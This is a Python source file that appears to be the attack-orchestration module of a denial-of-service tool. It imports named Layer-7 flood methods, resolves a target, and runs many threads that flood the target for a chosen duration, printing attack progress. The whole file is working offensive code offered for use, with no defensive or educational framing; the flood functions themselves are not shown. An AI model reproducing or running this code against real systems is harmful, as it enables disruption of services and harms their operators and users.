import sys
from threading import Thread
from time import sleep, time
from typing import Callable

from colorama import Fore
from humanfriendly import Spinner, format_timespan

from tools.crash import CriticalError
from tools.ip_tools import get_target_address


# Returns the flood method attack
def get_method_by_name(method: str) -> Callable:

    dir = f"tools.L7.{method.lower()}"
    module = __import__(dir, fromlist=["object"])
    method = getattr(module, "flood")
    return method


# Controls the attack methods
class AttackMethod:

    # Constructor
    def __init__(self, method_name, duration, threads, target):
        self.method_name = method_name
        self.duration = duration
        self.threads_count = threads
        self.target = target
        self.threads = []
        self.is_running = False

    # Entry-point
    def __enter__(self):
        self.method = get_method_by_name(self.method_name)
        self.target = get_target_address(self.target)
        return self

    # Exit-point
    def __exit__(self, exc_type, exc_value, traceback):
        pass

    # Verifies the execution time
    def __run_timer(self):
        __stopTime = time() + self.duration
        while time() < __stopTime:
            sleep(1)
        self.is_running = False

    # Starts the flooder
    def __run_flood(self):
        while self.is_running:
            self.method(self.target)

    # Starts the threads
    def __run_threads(self):

        # Starts threads timing
        timing = Thread(target=self.__run_timer)
        timing.start()

        # Creates the threads flood
        for _ in range(self.threads_count):
            thread = Thread(target=self.__run_flood)
            self.threads.append(thread)

        # Starts the threads flood
        with Spinner(
            label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))

        # Waits for the thread flood to end
        for index, thread in enumerate(self.threads):
            thread.join()
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}Thread {index + 1} stopped.{Fore.RESET}"
            )

        print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack Completed!{Fore.RESET}")

    # Starts DDOS attack
    def start(self):
        target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
        duration = format_timespan(self.duration)
        print(
            f"{Fore.MAGENTA}[?] {Fore.BLUE}Attacking {target} using the {self.method_name} method.{Fore.RESET}\n"
            f"{Fore.MAGENTA}[?] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
        )

        self.is_running = True

        try:
            self.__run_threads()

        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads..{Fore.RESET}"
            )

            # Waits for the threads to end
            for thread in self.threads:
                if thread.is_alive():
                    thread.join()

            print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack Interrupted!{Fore.RESET}")
            sys.exit(1)

        except Exception as err:
            CriticalError("An error ocurred during the attack", err)

        else:
            return True
